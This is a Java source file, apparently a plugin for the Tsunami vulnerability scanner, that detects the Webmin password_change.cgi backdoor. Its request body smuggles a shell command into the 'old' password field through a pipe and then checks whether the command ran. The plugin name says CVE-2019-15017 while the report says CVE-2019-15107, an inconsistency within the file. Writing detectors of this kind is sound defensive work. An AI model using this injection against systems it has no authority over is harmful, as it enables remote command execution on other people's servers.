/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve201915017;

import static com.google.api.client.http.UrlEncodedParser.CONTENT_TYPE;
import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static org.apache.http.HttpHeaders.ACCEPT;
import static org.apache.http.HttpHeaders.REFERER;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.MediaType;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.Severity;

import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2019-15017",
    version = "0.1",
    description =
        "This module exploits a backdoor in Webmin versions 1.890 through 1.920.Only the SourceForge "
            + "downloads were backdoored, but they are listed asofficial downloads on the project's site.Unknown "
            + "attacker(s) inserted Perl qx statements into the build server'ssource code on two separate"
            + " occasions: once in April 2018, introducingthe backdoor in the 1.890 release, and in July 2018, "
            + "reintroducing thebackdoor in releases 1.900 through 1.920.Only version 1.890 is exploitable in the "
            + "default install. Later affectedversions require the expired password changing feature to be enabled.",
    author = "hh-hunter",
    bootstrapModule = CVE201915107DetectorBootstrapModule.class)
public final class CVE201915107VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final String CHECK_VUL_PATH = "password_change.cgi";

  public static final String VULNERABLE_DATA =
      "user=rootxx&pam=&old=test|{{COMMAND}}&new1=test2&new2=test2&expired=2";

  private final HttpClient httpClient;

  private final Clock utcClock;

  private final PayloadGenerator payloadGenerator;

  // by the scanner.
  @Inject
  CVE201915107VulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2019-15017 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + CHECK_VUL_PATH;
    try {
      PayloadGeneratorConfig config =
          PayloadGeneratorConfig.newBuilder()
              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
              .setInterpretationEnvironment(
                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
              .setExecutionEnvironment(
                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
              .build();
      Payload payload = this.payloadGenerator.generate(config);
      HttpResponse httpResponse =
          httpClient.send(
              post(targetUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(CONTENT_TYPE, MediaType.FORM_DATA.toString())
                          .addHeader(ACCEPT, MediaType.HTML_UTF_8.toString())
                          .addHeader(
                              REFERER,
                              NetworkServiceUtils.buildWebApplicationRootUrl(networkService))
                          .build())
                  .setRequestBody(
                      ByteString.copyFrom(
                          VULNERABLE_DATA
                              .replace("{{COMMAND}}", payload.getPayload())
                              .getBytes("utf-8")))
                  .build(),
              networkService);

      if (!httpResponse.status().isSuccess()) {
        return false;
      }
      if (payload.checkIfExecuted(httpResponse.bodyString().get())) {
        return true;
      }

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    }
    return false;
  }

  // This builds the DetectionReport message for a specific vulnerable network service.
  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2019_15107"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2019-15107")
                .setDescription(
                    "This module exploits a backdoor in Webmin versions 1.890 through "
                        + "1.920.Only the SourceForge downloads were backdoored, but they are listed "
                        + "asofficial downloads on the project's site.Unknown attacker(s) inserted Perl"
                        + " qx statements into the build server'ssource code on two separate occasions:"
                        + " once in April 2018, introducingthe backdoor in the 1.890 release, "
                        + "and in July 2018, reintroducing thebackdoor in releases 1.900 through "
                        + "1.920.Only version 1.890 is exploitable in the default install."
                        + " Later affectedversions require the expired password changing feature "
                        + "to be enabled."))
        .build();
  }
}
